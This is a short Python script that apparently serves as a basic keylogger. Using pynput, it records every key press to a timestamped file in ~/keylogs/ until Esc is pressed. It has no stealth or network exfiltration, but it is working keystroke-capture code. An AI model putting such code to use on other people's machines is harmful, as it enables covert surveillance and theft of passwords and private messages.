from pynput import keyboard
import os
import logging
from datetime import datetime

# Set up logging
log_dir = os.path.expanduser('~/keylogs/')
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

logging.basicConfig(filename=log_file,
                    level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

